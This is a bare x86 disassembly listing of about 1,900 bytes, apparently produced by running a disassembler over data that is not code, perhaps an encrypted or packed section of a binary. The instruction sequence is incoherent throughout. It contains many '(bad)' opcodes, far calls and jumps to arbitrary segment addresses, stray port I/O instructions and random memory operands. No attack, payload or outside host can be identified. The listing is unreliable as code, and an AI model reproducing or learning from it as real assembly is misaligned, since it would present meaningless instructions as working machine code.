  42aa07:	stos   DWORD PTR es:[edi],eax
  42aa08:	mov    dl,0xef
  42aa0a:	xor    BYTE PTR [edi],ch
  42aa0c:	fdiv   st,st(1)
  42aa0e:	pop    edx
  42aa0f:	push   0x66
  42aa11:	or     edi,DWORD PTR ds:0xb377f84a
  42aa17:	imul   ecx,DWORD PTR [esi+0x50],0xffffff9a
  42aa1b:	add    DWORD PTR [edi-0x785957e5],edi
  42aa21:	xchg   esp,eax
  42aa22:	sub    edi,edi
  42aa24:	cmp    DWORD PTR [edx+ebx*4+0x3fcd3303],0x7a6c47e1
  42aa2f:	xchg   edi,eax
  42aa30:	mov    ebp,0xaa41fba1
  42aa35:	or     eax,DWORD PTR [eax-0x7e]
  42aa38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aa39:	xchg   edi,eax
  42aa3a:	call   FWORD PTR [edx+ebp*2+0x35]
  42aa3e:	not    bh
  42aa40:	lea    ecx,[ebx]
  42aa42:	leave  
  42aa43:	shl    DWORD PTR [ecx+0x2],cl
  42aa46:	cmp    eax,0x9a5de820
  42aa4b:	adc    eax,0x38fc9b29
  42aa50:	imul   ebp,DWORD PTR [edi],0xffffffa0
  42aa53:	lahf   
  42aa54:	xchg   esp,eax
  42aa55:	jmp    0xd7e474f4
  42aa5a:	fsub   QWORD PTR [edi-0x4d]
  42aa5d:	xor    ah,BYTE PTR [ecx-0x2c6bec30]
  42aa63:	sbb    DWORD PTR [ecx-0x5f],esi
  42aa66:	daa    
  42aa67:	xor    BYTE PTR [ebx-0x6e],dl
  42aa6a:	test   al,0x1b
  42aa6c:	lea    ecx,[ebx]
  42aa6e:	pushf  
  42aa6f:	loope  0x42aa66
  42aa71:	pop    esi
  42aa72:	inc    esp
  42aa73:	enter  0x6db2,0x76
  42aa77:	add    eax,0x704e0811
  42aa7c:	cmp    cl,BYTE PTR [ebx]
  42aa7e:	and    DWORD PTR [ebp+0x69],ecx
  42aa81:	xchg   esi,eax
  42aa82:	fnclex 
  42aa84:	inc    edi
  42aa85:	neg    BYTE PTR [ebp+0x48edefdd]
  42aa8b:	dec    esp
  42aa8c:	jne    0x42aa5f
  42aa8e:	ficomp DWORD PTR [edx-0x58c364e3]
  42aa94:	pop    ebx
  42aa95:	xchg   ebx,eax
  42aa96:	outs   dx,BYTE PTR ds:[esi]
  42aa97:	repnz dec ebp
  42aa99:	cwde   
  42aa9a:	popf   
  42aa9b:	test   al,0x88
  42aa9d:	inc    esi
  42aa9e:	call   0x3afddbc9
  42aaa3:	mov    ds:0xb142f93a,eax
  42aaa8:	dec    ebx
  42aaa9:	or     ebp,edi
  42aaab:	pop    ds
  42aaac:	addr16 enter 0x62f,0x19
  42aab1:	and    edx,ebp
  42aab3:	cmp    ah,al
  42aab5:	inc    ebx
  42aab6:	xchg   ebp,eax
  42aab7:	int3   
  42aab8:	dec    eax
  42aab9:	shr    DWORD PTR [eax+0x3ef59924],1
  42aabf:	daa    
  42aac0:	test   al,0x7d
  42aac2:	mov    bl,0x4d
  42aac4:	or     eax,0x6a4b43f0
  42aac9:	xchg   ebp,eax
  42aaca:	push   ebx
  42aacb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aacc:	add    al,0x20
  42aace:	inc    edx
  42aacf:	mov    ds:0xcf968557,al
  42aad4:	mov    dl,0x64
  42aad6:	pop    edi
  42aad7:	pop    es
  42aad8:	les    edx,FWORD PTR [ecx]
  42aada:	outs   dx,BYTE PTR ds:[esi]
  42aadb:	mov    esi,esp
  42aadd:	or     eax,ebp
  42aadf:	mov    bl,0xad
  42aae1:	sub    al,BYTE PTR [ecx]
  42aae3:	push   0xe59a5fd8
  42aae8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aae9:	icebp  
  42aaea:	outs   dx,DWORD PTR ds:[esi]
  42aaeb:	lods   eax,DWORD PTR ds:[esi]
  42aaec:	adc    BYTE PTR [edx],dh
  42aaee:	je     0x42aa97
  42aaf0:	imul   ecx,DWORD PTR [ebp+0x74aeb99b],0x33fa0c2f
  42aafa:	inc    ebx
  42aafb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aafc:	xchg   ecx,ebp
  42aafe:	mov    cs,eax
  42ab00:	pop    esp
  42ab01:	lods   al,BYTE PTR ds:[esi]
  42ab02:	cwde   
  42ab03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ab04:	push   es
  42ab05:	(bad)  [ecx-0x56]
  42ab08:	dec    esp
  42ab09:	shr    esi,1
  42ab0b:	mov    ds:0x2237afbb,al
  42ab10:	mov    ah,0xf6
  42ab12:	sbb    bh,BYTE PTR [ebp-0x36]
  42ab15:	xchg   esp,eax
  42ab16:	inc    edi
  42ab17:	aad    0xb2
  42ab19:	mov    al,ds:0x878834d7
  42ab1e:	jmp    0xf993:0x8e0b8bd9
  42ab25:	sbb    ebx,DWORD PTR [eax+ebp*1-0xd60a61a]
  42ab2c:	mov    al,ds:0x324481d8
  42ab31:	in     eax,dx
  42ab32:	(bad)  
  42ab33:	rol    BYTE PTR [esi],1
  42ab35:	or     ebx,DWORD PTR [eax+0x52]
  42ab38:	ror    BYTE PTR [eax+0x2c],cl
  42ab3b:	add    al,0x48
  42ab3d:	jmp    0x897a:0xe2d7549a
  42ab44:	adc    bl,al
  42ab46:	mov    edx,0xac7ec9a7
  42ab4b:	in     eax,dx
  42ab4c:	enter  0x569c,0xad
  42ab50:	mov    dl,0x5
  42ab52:	cli    
  42ab53:	mov    ebp,0xde2da52c
  42ab58:	adc    al,0xb
  42ab5a:	stos   DWORD PTR es:[edi],eax
  42ab5b:	push   es
  42ab5c:	mov    edx,0x6ec36fde
  42ab61:	mov    bh,0x9a
  42ab63:	sub    BYTE PTR cs:[edx],ah
  42ab66:	mov    ebp,ecx
  42ab68:	dec    ebp
  42ab69:	adc    bl,dl
  42ab6b:	pop    ebx
  42ab6c:	inc    eax
  42ab6d:	stc    
  42ab6e:	(bad)  
  42ab70:	cdq    
  42ab71:	ret    0xa7a5
  42ab74:	and    ebx,edi
  42ab76:	ins    BYTE PTR es:[edi],dx
  42ab77:	pop    esi
  42ab78:	mov    bl,0x82
  42ab7a:	xchg   ebp,eax
  42ab7b:	and    edi,DWORD PTR [edi]
  42ab7d:	mov    ebp,0xe5b590fe
  42ab82:	loopne 0x42ab6a
  42ab84:	sbb    BYTE PTR [edx+0xb60abde],0xce
  42ab8b:	inc    ebx
  42ab8c:	mov    eax,ds:0xd7338c81
  42ab91:	mov    eax,0xc113579a
  42ab96:	fnstcw WORD PTR es:[ebp-0x2a]
  42ab9a:	add    BYTE PTR [edi+0x2d1ea9ef],ah
  42aba0:	sahf   
  42aba1:	dec    edx
  42aba2:	inc    ecx
  42aba3:	jns    0x42ab57
  42aba5:	data16 add BYTE PTR [eax-0x3d],0xee
  42abaa:	pop    edx
  42abab:	stc    
  42abac:	cmp    esi,DWORD PTR [ecx-0x5c]
  42abaf:	mov    al,ds:0x77e73917
  42abb4:	es or  eax,ebp
  42abb7:	pop    edx
  42abb8:	loop   0x42abfe
  42abba:	call   0xa78a:0x6410401f
  42abc1:	dec    esi
  42abc2:	scas   al,BYTE PTR es:[edi]
  42abc3:	test   al,0xd1
  42abc5:	xchg   esp,eax
  42abc6:	xlat   BYTE PTR ds:[ebx]
  42abc7:	aas    
  42abc8:	adc    edx,ebx
  42abca:	inc    eax
  42abcb:	jp     0x42abed
  42abcd:	in     eax,dx
  42abce:	fcmove st,st(4)
  42abd0:	push   edx
  42abd1:	in     eax,0x9a
  42abd3:	xor    bh,dh
  42abd5:	ins    BYTE PTR es:[edi],dx
  42abd6:	mov    ch,0xb7
  42abd8:	(bad)  
  42abd9:	cld    
  42abda:	fdivr  DWORD PTR [eax+0x679c2726]
  42abe0:	ins    DWORD PTR es:[edi],dx
  42abe1:	dec    BYTE PTR [edi]
  42abe3:	jne    0x42aba6
  42abe5:	lds    ebx,FWORD PTR [ecx+0x694dd02b]
  42abeb:	mov    al,0x5f
  42abed:	ret    
  42abee:	cld    
  42abef:	add    ebp,DWORD PTR [ebx+0x4]
  42abf2:	xchg   esp,eax
  42abf3:	shl    BYTE PTR [eax+0x1f],1
  42abf6:	cli    
  42abf7:	fidivr WORD PTR [edx]
  42abf9:	arpl   cx,bx
  42abfb:	nop
  42abfc:	mov    esi,edx
  42abfe:	inc    ebp
  42abff:	daa    
  42ac00:	jmp    0x3004:0x32494f85
  42ac07:	mov    al,ds:0x33418e1e
  42ac0c:	ss sti 
  42ac0e:	shl    BYTE PTR [ecx-0x21],0xa4
  42ac12:	out    0xab,eax
  42ac14:	mov    ebp,0x34fe9934
  42ac19:	sub    esi,ebp
  42ac1b:	xor    BYTE PTR [edi-0x20],0xd9
  42ac1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ac20:	leave  
  42ac21:	pusha  
  42ac22:	push   ecx
  42ac23:	lods   eax,DWORD PTR ds:[esi]
  42ac24:	scas   eax,DWORD PTR es:[edi]
  42ac25:	cli    
  42ac26:	jnp    0x42aca7
  42ac28:	add    ch,ah
  42ac2a:	fwait
  42ac2b:	xchg   ebp,eax
  42ac2c:	lods   eax,DWORD PTR ds:[esi]
  42ac2d:	popf   
  42ac2e:	add    DWORD PTR [ecx-0x2888d093],edx
  42ac34:	sar    BYTE PTR [eax+0x1490171c],cl
  42ac3a:	into   
  42ac3b:	and    eax,0xf66acba4
  42ac40:	sbb    bh,bh
  42ac42:	push   ss
  42ac43:	(bad)  
  42ac44:	mov    dl,0x9
  42ac46:	mov    bl,0x8a
  42ac48:	inc    ecx
  42ac49:	pop    ecx
  42ac4a:	sub    bh,BYTE PTR [edx]
  42ac4c:	imul   eax,DWORD PTR ds:0xdecd421f,0x7a
  42ac53:	mov    ds:0x3573648d,al
  42ac58:	mov    bl,0xd
  42ac5a:	xor    eax,0x92898990
  42ac5f:	push   esi
  42ac60:	repz mov bh,0x49
  42ac63:	sbb    BYTE PTR [edx-0x77c46fb1],cl
  42ac69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ac6a:	or     ah,BYTE PTR [edi+0x6766f85b]
  42ac70:	and    DWORD PTR [esi+0x325acc9a],ebx
  42ac76:	retf   0xeb90
  42ac79:	jne    0x42acb2
  42ac7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ac7c:	and    eax,eax
  42ac7e:	adc    esp,DWORD PTR [edx-0x376255ba]
  42ac84:	mov    dl,0x90
  42ac86:	mov    ebx,0x224268f6
  42ac8b:	mov    ds:0x589804f0,eax
  42ac90:	push   eax
  42ac91:	in     eax,0x1a
  42ac93:	mov    bh,BYTE PTR [edi-0x16773db]
  42ac99:	lods   eax,DWORD PTR ds:[esi]
  42ac9a:	xor    esp,DWORD PTR [edi+0x3150706f]
  42aca0:	(bad)
  42aca4:	push   ebx
  42aca5:	sub    eax,DWORD PTR [edi]
  42aca7:	call   0x3c58df10
  42acac:	mov    dl,0x42
  42acae:	jecxz  0x42ac8c
  42acb0:	jnp    0x42acd1
  42acb2:	out    0x43,eax
  42acb4:	dec    edx
  42acb5:	or     ebp,ebx
  42acb7:	jecxz  0x42aceb
  42acb9:	mov    ch,dl
  42acbb:	bound  ebx,QWORD PTR [ebx+0x75]
  42acbe:	call   0xf383:0xd44bbb79
  42acc5:	pop    eax
  42acc6:	mov    esp,DWORD PTR [edi+0x28a113be]
  42accc:	in     eax,dx
  42accd:	mov    DWORD PTR [esi],0x7723b2ef
  42acd3:	xchg   ecx,eax
  42acd4:	je     0x42ad27
  42acd6:	mov    ecx,0x8808b4c4
  42acdb:	into   
  42acdc:	imul   ecx,DWORD PTR [esi+0x7b],0xdd1db547
  42ace3:	jge    0x42ac93
  42ace5:	mov    DWORD PTR [edx-0x3a],ecx
  42ace8:	add    eax,0xa7a73dae
  42aced:	push   esi
  42acee:	and    DWORD PTR [ecx+eax*8-0x23],eax
  42acf2:	mov    al,ds:0x4dfcb2f9
  42acf7:	jg     0x42ac9d
  42acf9:	pop    esp
  42acfa:	xchg   edi,eax
  42acfb:	aad    0x33
  42acfd:	jmp    0xc6565585
  42ad02:	jp     0x42ad40
  42ad04:	iret   
  42ad05:	dec    edi
  42ad06:	push   ecx
  42ad07:	mov    dh,0xa7
  42ad09:	retf   
  42ad0a:	xchg   ebp,eax
  42ad0b:	lds    ebx,FWORD PTR [ecx]
  42ad0d:	sbb    ebx,DWORD PTR [ebx-0x46bebd1e]
  42ad13:	nop
  42ad14:	test   eax,0xf1cf1a8d
  42ad19:	dec    esp
  42ad1a:	scas   al,BYTE PTR es:[edi]
  42ad1b:	inc    edx
  42ad1c:	push   eax
  42ad1d:	sub    ebp,0xdff1ad01
  42ad23:	cmp    dh,bl
  42ad25:	rol    DWORD PTR [esi-0x72],1
  42ad28:	push   0x37
  42ad2a:	stos   BYTE PTR es:[edi],al
  42ad2b:	inc    edi
  42ad2c:	test   BYTE PTR [ebx],cl
  42ad2e:	lods   eax,DWORD PTR ds:[esi]
  42ad2f:	ins    DWORD PTR es:[edi],dx
  42ad30:	popa   
  42ad31:	inc    edx
  42ad32:	xchg   ebx,eax
  42ad33:	dec    ebp
  42ad34:	adc    eax,0xb12be177
  42ad39:	enter  0x51d9,0xfa
  42ad3d:	jecxz  0x42ad9c
  42ad3f:	aas    
  42ad40:	(bad)  
  42ad41:	adc    bl,BYTE PTR [esi+eiz*4]
  42ad44:	lea    ebx,ds:0xc29d2555
  42ad4a:	rcl    BYTE PTR [ebx-0x7f],1
  42ad4d:	repnz call 0x1141:0x799ffe31
  42ad55:	addr16 dec edi
  42ad57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ad58:	jne    0x42ad73
  42ad5a:	lds    esp,FWORD PTR [ebx+0x1f]
  42ad5d:	xor    esp,DWORD PTR [eiz*8+0x537477ad]
  42ad64:	repnz add BYTE PTR [edx],ch
  42ad67:	pop    esi
  42ad68:	xchg   ecx,eax
  42ad69:	inc    eax
  42ad6a:	fwait
  42ad6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ad6c:	sub    al,0x7f
  42ad6e:	cmp    edx,ecx
  42ad70:	push   ebx
  42ad71:	aaa    
  42ad72:	shr    BYTE PTR [ecx-0x4e],0xab
  42ad76:	mov    ds:0x3f7de2b6,eax
  42ad7b:	dec    ebp
  42ad7c:	ror    BYTE PTR [ebx],cl
  42ad7e:	and    ecx,ebx
  42ad80:	push   esi
  42ad81:	fs or  al,0xb9
  42ad84:	fdivr  st(3),st
  42ad86:	call   0x4d70:0xf72648fb
  42ad8d:	ins    BYTE PTR es:[edi],dx
  42ad8e:	mov    esp,0x260c7dd8
  42ad93:	and    DWORD PTR [ecx+0x23],0xffffff92
  42ad97:	pop    ss
  42ad98:	inc    edi
  42ad99:	ret    
  42ad9a:	mov    edx,ebx
  42ad9c:	lods   al,BYTE PTR ds:[esi]
  42ad9d:	mov    ah,0xa9
  42ad9f:	out    0x9,eax
  42ada1:	or     esp,DWORD PTR [ecx-0xd543209]
  42ada7:	ins    DWORD PTR es:[edi],dx
  42ada8:	call   0x7219e8c4
  42adad:	mov    dl,BYTE PTR [ebx]
  42adaf:	ja     0x42adff
  42adb1:	addr16 jns 0x42ae1f
  42adb4:	and    eax,0x81999a4b
  42adb9:	xchg   bl,bh
  42adbb:	dec    ebx
  42adbc:	aad    0x47
  42adbe:	cmc    
  42adbf:	cdq    
  42adc0:	dec    esp
  42adc1:	inc    eax
  42adc2:	pop    es
  42adc3:	or     al,0x12
  42adc5:	dec    ebx
  42adc6:	es ds mov eax,0xb243d03b
  42adcd:	jmp    0x37e1460b
  42add2:	fidiv  DWORD PTR [ebx]
  42add4:	stos   DWORD PTR es:[edi],eax
  42add5:	out    dx,eax
  42add6:	daa    
  42add7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42add8:	sub    al,0x5
  42adda:	mov    cl,0x93
  42addc:	push   es
  42addd:	fsincos 
  42addf:	mov    ds:0xea56dae,eax
  42ade4:	xor    al,BYTE PTR [ecx+0x2d]
  42ade7:	cmp    DWORD PTR [ebx-0x6e],0xfd14b18f
  42adee:	shl    DWORD PTR [edi+0x782748c7],cl
  42adf4:	mov    al,ds:0x4d039bb5
  42adf9:	sub    BYTE PTR [edi+0x52de436b],bl
  42adff:	sub    BYTE PTR [edi],dh
  42ae01:	repz push es
  42ae03:	add    DWORD PTR [esi+0x47],0x7169a86b
  42ae0a:	cmp    bl,cl
  42ae0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ae0d:	push   esi
  42ae0e:	fucomip st,st(6)
  42ae10:	mov    dl,0xd9
  42ae12:	aaa    
  42ae13:	sbb    BYTE PTR [ecx],bl
  42ae15:	adc    eax,0xb4e877d
  42ae1a:	mov    edi,0xd2a32876
  42ae1f:	aam    0x66
  42ae21:	or     bl,BYTE PTR [edx-0xacec03c]
  42ae27:	inc    edi
  42ae28:	push   ebx
  42ae29:	test   eax,0xb065560
  42ae2e:	jle    0x42ae9e
  42ae30:	or     esi,DWORD PTR [ebp-0x49078022]
  42ae36:	pusha  
  42ae37:	je     0x42ae91
  42ae39:	mov    ss,WORD PTR [ebx+ecx*2-0x670aa0f]
  42ae40:	fs pop es
  42ae42:	cdq    
  42ae43:	or     DWORD PTR [esi+edx*8-0x46],esi
  42ae47:	outs   dx,BYTE PTR ds:[esi]
  42ae48:	and    BYTE PTR [ecx+0xb724a72],dh
  42ae4e:	inc    esp
  42ae4f:	aas    
  42ae50:	adc    edx,edx
  42ae52:	jnp    0x42add8
  42ae54:	jo     0x42ae8b
  42ae56:	xchg   ebp,eax
  42ae57:	and    ch,BYTE PTR [esi-0x131df8fd]
  42ae5d:	ja     0x42adf9
  42ae5f:	push   es
  42ae60:	(bad)  
  42ae62:	adc    al,0x7
  42ae64:	xor    al,0xb
  42ae66:	gs push es
  42ae68:	aad    0xbc
  42ae6a:	sub    ebx,DWORD PTR [ecx]
  42ae6c:	or     bl,BYTE PTR [esi]
  42ae6e:	cdq    
  42ae6f:	jge    0x42ae90
  42ae71:	fidivr DWORD PTR [eax-0x6854ba5c]
  42ae77:	stc    
  42ae78:	ror    BYTE PTR [ebx],1
  42ae7a:	mov    eax,ds:0x503b3b5
  42ae7f:	(bad)  [edi-0x63]
  42ae82:	xchg   ch,ch
  42ae84:	stc    
  42ae85:	push   ebx
  42ae86:	call   0x14e6:0xcbe95af0
  42ae8d:	xor    bl,BYTE PTR cs:[eax+0x38562352]
  42ae94:	mov    dl,0xea
  42ae96:	mov    ch,0x35
  42ae98:	pushf  
  42ae99:	pop    esp
  42ae9a:	fidivr DWORD PTR [edx]
  42ae9c:	test   DWORD PTR [ebx],ecx
  42ae9e:	data16 sbb al,0xf8
  42aea1:	repnz sbb ebp,DWORD PTR [edx+0x7899cdff]
  42aea8:	rcr    DWORD PTR [ecx+ebx*4],cl
  42aeab:	jnp    0x42aeeb
  42aead:	mov    WORD PTR [ebp-0x1d5c0899],fs
  42aeb3:	pop    es
  42aeb4:	push   0x445e2e0b
  42aeb9:	cmc    
  42aeba:	pushf  
  42aebb:	inc    edx
  42aebc:	in     eax,0xef
  42aebe:	call   0xb969:0xb04be66a
  42aec5:	ficomp DWORD PTR [edx]
  42aec7:	test   eax,0x89d5bd29
  42aecc:	in     eax,dx
  42aecd:	dec    eax
  42aece:	mov    BYTE PTR [ecx-0x32],ah
  42aed1:	push   ds
  42aed2:	push   0x18
  42aed4:	sub    bh,BYTE PTR [ecx]
  42aed6:	call   0xf910:0xb05408c5
  42aedd:	add    ah,BYTE PTR [edi]
  42aedf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aee0:	dec    esp
  42aee1:	xor    al,al
  42aee3:	fbld   TBYTE PTR [edi]
  42aee5:	call   0x96100e6d
  42aeea:	call   0x8566:0x1593557
  42aef1:	fiadd  WORD PTR [ecx+0x37]
  42aef4:	add    al,0xf3
  42aef6:	and    dh,dl
  42aef8:	lea    ecx,[ebx]
  42aefa:	pop    ss
  42aefb:	jmp    0xb5a3cf18
  42af00:	sbb    al,BYTE PTR [edx+ebx*4]
  42af03:	fidivr DWORD PTR [edi+eax*2-0x12]
  42af07:	mov    cl,0x3
  42af09:	mov    ah,0xc6
  42af0b:	mov    edi,0x19d4ea57
  42af10:	or     edx,ecx
  42af12:	call   0x96be:0x312d352c
  42af19:	or     DWORD PTR [edx+0x62c65ea7],0x4ccaa58
  42af23:	es mov ebp,0xdf32e1f2
  42af29:	jmp    0x42af57
  42af2b:	adc    al,0x85
  42af2d:	daa    
  42af2e:	inc    ecx
  42af2f:	mov    eax,0x2038f9b4
  42af34:	js     0x42af0b
  42af36:	and    ah,ah
  42af38:	inc    edi
  42af39:	ret    0xba32
  42af3c:	(bad)  
  42af3e:	call   0xc560:0x3aa2cc5d
  42af45:	push   eax
  42af46:	loopne 0x42aeef
  42af48:	and    al,0xdc
  42af4a:	mov    ecx,0x2f8d7f17
  42af4f:	adc    al,0xae
  42af51:	clc    
  42af52:	lock test al,0xed
  42af55:	sbb    BYTE PTR [edx+0x41],0xd9
  42af59:	call   0xdeae:0x4325a51b
  42af60:	mov    dl,0x96
  42af62:	jecxz  0x42af5b
  42af64:	mov    ebx,?
  42af66:	fwait
  42af67:	inc    ebp
  42af68:	mov    dl,0x52
  42af6a:	and    bh,BYTE PTR [esi]
  42af6c:	cmp    edi,esi
  42af6e:	test   BYTE PTR [esi],0xb9
  42af71:	or     ebp,eax
  42af73:	rcl    edi,0x85
  42af76:	sub    ah,BYTE PTR [edx+ebp*4-0x4b8465a7]
  42af7d:	leave  
  42af7e:	push   eax
  42af7f:	sub    eax,0xa776f410
  42af84:	ror    BYTE PTR [edx+0x1e],0x24
  42af88:	sbb    BYTE PTR [edi],dl
  42af8a:	test   BYTE PTR [edi+0x316108b2],dh
  42af90:	sbb    esi,ebx
  42af92:	test   al,0xf8
  42af94:	push   ecx
  42af95:	or     ebp,DWORD PTR [edi+0x49777b27]
  42af9b:	rcr    BYTE PTR [eax+ecx*8],1
  42af9e:	call   0xdf46:0x9bad66e2
  42afa5:	jno    0x42afc3
  42afa7:	xlat   BYTE PTR ds:[ebx]
  42afa8:	repnz or ah,bl
  42afab:	stos   DWORD PTR es:[edi],eax
  42afac:	jb     0x42af4c
  42afae:	push   es
  42afaf:	jno    0x42affb
  42afb1:	out    0x5c,eax
  42afb3:	xor    esi,DWORD PTR [edx-0x3b776241]
  42afb9:	jecxz  0x42afe7
  42afbb:	fimul  DWORD PTR fs:[eax]
  42afbe:	push   esp
  42afbf:	inc    esp
  42afc0:	iret   
  42afc1:	dec    edx
  42afc2:	pop    ebx
  42afc3:	inc    edi
  42afc4:	xor    dl,BYTE PTR [eax+0x2]
  42afc7:	aaa    
  42afc8:	mov    bl,0x4f
  42afca:	inc    ebp
  42afcb:	dec    ecx
  42afcc:	push   ss
  42afcd:	sub    DWORD PTR [esi-0x62],ebx
  42afd0:	dec    edx
  42afd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42afd2:	jecxz  0x42af78
  42afd4:	ss dec ecx
  42afd6:	adc    DWORD PTR [eax+0x2e7a8596],0xffffffd2
  42afdd:	sbb    al,0x9a
  42afdf:	ins    DWORD PTR es:[edi],dx
  42afe0:	call   0xd54c:0x7eaccd2
  42afe7:	xlat   BYTE PTR ds:[ebx]
  42afe8:	mov    ecx,0x319ede01
  42afed:	mov    bh,BYTE PTR [eax]
  42afef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aff0:	push   edi
  42aff1:	mov    eax,DWORD PTR [esi-0x655c5d7b]
  42aff7:	out    0xdf,al
  42aff9:	mov    edi,0xae8ace39
  42affe:	mov    cl,0xa7
  42b000:	call   0x6a67789e
  42b005:	in     al,0x8a
  42b007:	fdivr  QWORD PTR [eax+esi*4+0x2cd8dd5e]
  42b00e:	mov    esp,DWORD PTR [ebp+0x3978f752]
  42b014:	popa   
  42b015:	or     ecx,edi
  42b017:	sbb    BYTE PTR [edx],0x9c
  42b01a:	rcl    DWORD PTR [edx],1
  42b01c:	int3   
  42b01d:	retf   0xba9a
  42b020:	mul    BYTE PTR [eax]
  42b022:	jno    0x42afc2
  42b024:	inc    DWORD PTR [edx+esi*2+0x4b8a3ca6]
  42b02b:	cmp    DWORD PTR [edi+0x72],edi
  42b02e:	aam    0x4a
  42b030:	and    edx,edi
  42b032:	call   0xf29762fd
  42b037:	mov    ch,0xb9
  42b039:	lock jl 0x42b04c
  42b03c:	test   eax,0x1dfff80b
  42b041:	retf   0xe8a3
  42b044:	xchg   edx,eax
  42b045:	add    al,0x9a
  42b047:	out    0x19,al
  42b049:	adc    DWORD PTR [esi-0x21],ecx
  42b04c:	call   DWORD PTR ds:0x856da73c
  42b052:	mov    cs,WORD PTR [edi+esi*8-0x4dfaf31e]
  42b059:	neg    BYTE PTR [edi]
  42b05b:	test   al,0x9
  42b05d:	push   0x1d
  42b05f:	dec    ebp
  42b060:	jno    0x42b01d
  42b062:	in     al,dx
  42b063:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b064:	(bad)  
  42b066:	(bad)  
  42b067:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b068:	scas   eax,DWORD PTR es:[edi]
  42b069:	xchg   ecx,eax
  42b06a:	lea    ebp,[bp+si]
  42b06d:	jo     0x42b009
  42b06f:	mov    edi,0xa1f7f0d3
  42b074:	ret    0xdc6
  42b077:	mov    ecx,0x681fe4d0
  42b07c:	mov    edx,0x91eefad8
  42b081:	loope  0x42b019
  42b083:	cmc    
  42b084:	mov    dl,0xae
  42b086:	jmp    0xd84305f8
  42b08b:	mov    ebp,0xacc27c0a
  42b090:	or     DWORD PTR [ecx],edi
  42b092:	pop    ds
  42b093:	mov    dl,0x92
  42b095:	outs   dx,BYTE PTR ds:[esi]
  42b096:	dec    ebx
  42b097:	cwde   
  42b098:	pop    edi
  42b099:	jne    0x42b084
  42b09b:	mov    WORD PTR [edx-0x7eded6c6],?
  42b0a1:	(bad)  
  42b0a2:	mov    al,ds:0x920a7d69
  42b0a7:	fcomp  DWORD PTR [edi]
  42b0a9:	das    
  42b0aa:	clc    
  42b0ab:	test   al,0x3d
  42b0ad:	retf   
  42b0ae:	jo     0x42b047
  42b0b0:	scas   al,BYTE PTR es:[edi]
  42b0b1:	or     dl,cl
  42b0b3:	dec    ecx
  42b0b4:	jae    0x42b0e3
  42b0b6:	pop    esp
  42b0b7:	jl     0x42b049
  42b0b9:	mov    ebx,0x75b249e2
  42b0be:	outs   dx,BYTE PTR ds:[esi]
  42b0bf:	or     al,0x7
  42b0c1:	jno    0x42b127
  42b0c3:	aam    0xb2
  42b0c5:	iret   
  42b0c6:	stc    
  42b0c7:	stos   BYTE PTR es:[edi],al
  42b0c8:	mov    ds:0x669749b7,eax
  42b0cd:	inc    ebx
  42b0ce:	mov    ah,0xc9
  42b0d0:	mov    dl,0x2c
  42b0d2:	bound  esi,QWORD PTR [ebp+0x4a987cb5]
  42b0d8:	mov    bl,0x4d
  42b0da:	add    al,0x33
  42b0dc:	mov    ah,0x8c
  42b0de:	fild   WORD PTR [ebx+0x5a]
  42b0e1:	push   edi
  42b0e2:	mul    BYTE PTR [edi-0x1b191555]
  42b0e8:	push   0xb2a5cd94
  42b0ed:	je     0x42b10f
  42b0ef:	not    DWORD PTR [esi-0x235208e0]
  42b0f5:	or     edi,DWORD PTR [eax-0x2e]
  42b0f8:	and    edx,DWORD PTR [ebx+0x10a188f9]
  42b0fe:	call   0x2228:0xeafc4ece
  42b105:	(bad)  
  42b106:	stos   DWORD PTR es:[edi],eax
  42b107:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b108:	imul   edx,DWORD PTR [edi+edx*8+0x13],0xb6722389
  42b110:	jg     0x42b191
  42b112:	call   0x853b:0x469513a4
  42b119:	jnp    0x42b12a
  42b11b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b11c:	xchg   esi,eax
  42b11d:	ffreep st(4)
  42b11f:	icebp  
  42b120:	dec    ecx
  42b121:	retf   
  42b122:	int    0x91
  42b124:	mov    dl,0x27
  42b126:	mov    al,ds:0x84119355
  42b12b:	cmp    BYTE PTR [edx-0x74131cf5],cl
  42b131:	cs lahf 
  42b133:	xor    ch,cl
  42b135:	xchg   ecx,eax
  42b136:	call   0x69af:0xd7ba9e6a
  42b13d:	test   eax,0xc3cba68b
  42b142:	jp     0x42b187
  42b144:	aad    0x9f
  42b146:	popa   
  42b147:	arpl   WORD PTR [edx],di
  42b149:	adc    bl,BYTE PTR [edx-0xd62ea28]
  42b14f:	lahf   
  42b150:	inc    esp
  42b151:	out    0x43,eax
  42b153:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b154:	push   cs
  42b155:	inc    edi
  42b156:	jns    0x42b18d
  42b158:	pop    ds
  42b159:	lock jmp 0xe0f7:0x30eab54c
  42b161:	pushf  
  42b162:	or     edx,DWORD PTR [ecx-0x66952668]
  42b168:	inc    esi
  42b169:	or     esi,esp
  42b16b:	retf   
  42b16c:	mov    edi,0x97b5e91c
  42b171:	pop    esi
  42b172:	call   0x7094:0xe23bfe93
  42b179:	and    BYTE PTR [eax+0x720963a7],dl
  42b17f:	js     0x42b1da
  42b181:	and    edx,DWORD PTR [edx+ecx*1]
  42b184:	mov    dl,0xf3
  42b186:	fcmovb st,st(6)
  42b188:	mov    bl,0xdc
  42b18a:	into   
  42b18b:	mov    edx,0xad680bfc
  42b190:	mov    BYTE PTR ds:0xa78b8c6c,cl
  42b196:	mov    ah,0xa0
  42b198:	(bad)  
  42b199:	scas   al,BYTE PTR es:[edi]
